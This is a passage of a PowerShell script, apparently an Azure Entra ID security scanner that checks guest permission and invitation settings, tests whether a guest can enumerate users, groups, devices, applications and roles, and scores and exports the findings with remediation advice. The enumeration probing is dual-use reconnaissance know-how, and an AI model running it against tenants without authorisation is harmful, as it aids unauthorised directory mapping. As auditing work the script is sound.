                Write-ColorOutput -Message "    [!] WARNING: Guest permissions are not fully restricted" -Color "Yellow"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "GuestPermissions"
                    Risk = "MEDIUM"
                    Description = "Guest users have limited but not fully restricted permissions"
                    Recommendation = "Consider restricting guest access to most restrictive level"
                }
                $scanResults.RiskScore += 20
            } else {
                Write-ColorOutput -Message "    [+] Guest permissions are properly restricted" -Color "Green"
            }
        } else {
            Write-ColorOutput -Message "    [!] Could not retrieve guest permission policy" -Color "Red"
        }
        
        # 2.2 Get external collaboration settings
        Write-ColorOutput -Message "`n[*] Checking external collaboration settings..." -Color "Yellow"
        
        $collabSettings = Get-ExternalCollaborationSettings
        $scanResults.Phase2_Authenticated.CollaborationSettings = $collabSettings
        
        if ($collabSettings.Success) {
            Write-ColorOutput -Message "    [*] Guest invitations allowed from: $($collabSettings.AllowInvitesFrom)" -Color "Cyan"
            
            if ($collabSettings.AllowInvitesFrom -eq "everyone") {
                Write-ColorOutput -Message "    [!] WARNING: All users can invite guests" -Color "Yellow"
                $scanResults.Vulnerabilities += [PSCustomObject]@{
                    Type = "GuestInvitations"
                    Risk = "LOW"
                    Description = "All users in the organization can invite guest users"
                    Recommendation = "Restrict guest invitations to admins only"
                }
                $scanResults.RiskScore += 10
            }
        }
        
        # 2.3 Test actual guest permissions by attempting to enumerate resources
        Write-ColorOutput -Message "`n[*] Testing guest access to directory resources..." -Color "Yellow"
        
        $permissionTests = @("Users", "Groups", "Devices", "Applications", "DirectoryRoles")
        $accessibleResources = @()
        
        foreach ($testType in $permissionTests) {
            Write-ColorOutput -Message "    [*] Testing access to: $testType..." -Color "DarkGray"
            $testResult = Test-GuestUserPermissions -TestType $testType
            
            if ($testResult.Accessible) {
                Write-ColorOutput -Message "    [+] $testType : ACCESSIBLE (Found $($testResult.ItemCount) items)" -Color "Green"
                $accessibleResources += $testType
                
                # This is a vulnerability if user is a guest
                if ($isGuest) {
                    $scanResults.Vulnerabilities += [PSCustomObject]@{
                        Type = "GuestEnumeration"
                        Risk = "HIGH"
                        Description = "Guest user can enumerate $testType - Azure Null Session equivalent"
                        Recommendation = "Review and restrict guest access to $testType"
                        ResourceType = $testType
                        ItemCount = $testResult.ItemCount
                    }
                    $scanResults.RiskScore += 15
                }
            } else {
                Write-ColorOutput -Message "    [-] $testType : BLOCKED" -Color "DarkGray"
            }
        }
        
        $scanResults.Phase2_Authenticated.AccessibleResources = $accessibleResources
        $scanResults.Phase2_Authenticated.PermissionTests = $permissionTests
        
        # 2.4 Compare guest vs member access
        Write-ColorOutput -Message "`n[*] Access Level Summary:" -Color "Yellow"
        Write-ColorOutput -Message "    Current User Type: $(if ($isGuest) { 'GUEST' } else { 'MEMBER' })" -Color $(if ($isGuest) { "Yellow" } else { "Cyan" })
        Write-ColorOutput -Message "    Accessible Resources: $($accessibleResources.Count) / $($permissionTests.Count)" -Color "Cyan"
        
        if ($isGuest -and $accessibleResources.Count -gt 0) {
            Write-ColorOutput -Message "    [!] VULNERABILITY: Guest can enumerate $($accessibleResources.Count) resource type(s)" -Color "Red"
        }
    }
    
    # ============================================
    # PHASE 3: SECURITY ASSESSMENT REPORT
    # ============================================
    Write-ColorOutput -Message "`n[*] PHASE 3: Security Assessment Report" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    # Calculate final risk score and rating
    $riskRating = if ($scanResults.RiskScore -ge 70) { "CRITICAL" }
                  elseif ($scanResults.RiskScore -ge 40) { "HIGH" }
                  elseif ($scanResults.RiskScore -ge 20) { "MEDIUM" }
                  else { "LOW" }
    
    $riskColor = switch ($riskRating) {
        "CRITICAL" { "Red" }
        "HIGH" { "Yellow" }
        "MEDIUM" { "Yellow" }
        "LOW" { "Green" }
    }
    
    Write-ColorOutput -Message "[*] Overall Risk Score: $($scanResults.RiskScore) / 100" -Color $riskColor
    Write-ColorOutput -Message "[*] Risk Rating: $riskRating" -Color $riskColor
    Write-ColorOutput -Message "[*] Vulnerabilities Found: $($scanResults.Vulnerabilities.Count)" -Color $(if ($scanResults.Vulnerabilities.Count -gt 0) { "Yellow" } else { "Green" })
    
    if ($scanResults.Vulnerabilities.Count -gt 0) {
        Write-ColorOutput -Message "`n[*] Vulnerability Details:" -Color "Yellow"
        
        foreach ($vuln in $scanResults.Vulnerabilities) {
            $vulnColor = switch ($vuln.Risk) {
                "CRITICAL" { "Red" }
                "HIGH" { "Red" }
                "MEDIUM" { "Yellow" }
                "LOW" { "DarkGray" }
            }
            
            Write-ColorOutput -Message "`n    [$($vuln.Risk)] $($vuln.Type)" -Color $vulnColor
            Write-ColorOutput -Message "    Description: $($vuln.Description)" -Color "DarkGray"
            Write-ColorOutput -Message "    Recommendation: $($vuln.Recommendation)" -Color "Cyan"
        }
    }
    
    # Summary
    $scanResults.Summary = @{
        RiskScore = $scanResults.RiskScore
        RiskRating = $riskRating
        VulnerabilityCount = $scanResults.Vulnerabilities.Count
        CriticalCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "CRITICAL" }).Count
        HighCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "HIGH" }).Count
        MediumCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "MEDIUM" }).Count
        LowCount = ($scanResults.Vulnerabilities | Where-Object { $_.Risk -eq "LOW" }).Count
    }
    
    Write-ColorOutput -Message "`n[*] Scan Complete!" -Color "Green"
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".json") {
                $scanResults | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "[+] Full report exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".csv") {
                $scanResults.Vulnerabilities | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "[+] Vulnerabilities exported to: $ExportPath" -Color "Green"
            } else {
                $scanResults | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "[+] Report exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    # Recommendations
    Write-ColorOutput -Message "`n[*] Next Steps:" -Color "Yellow"
    if ($scanResults.RiskScore -ge 40) {
        Write-ColorOutput -Message "    1. Review and restrict guest user permissions immediately" -Color "Cyan"
        Write-ColorOutput -Message "    2. Implement Conditional Access policies for guest users" -Color "Cyan"
        Write-ColorOutput -Message "    3. Audit existing guest accounts and remove unnecessary ones" -Color "Cyan"
        Write-ColorOutput -Message "    4. Enable guest access reviews in Azure Entra ID" -Color "Cyan"
    } else {
        Write-ColorOutput -Message "    1. Continue monitoring guest user activity" -Color "Cyan"
        Write-ColorOutput -Message "    2. Review guest access policies periodically" -Color "Cyan"
        Write-ColorOutput -Message "    3. Implement logging and alerting for guest enumeration" -Color "Cyan"
    }
    
    Write-ColorOutput -Message ""
}

# Tenant discovery function
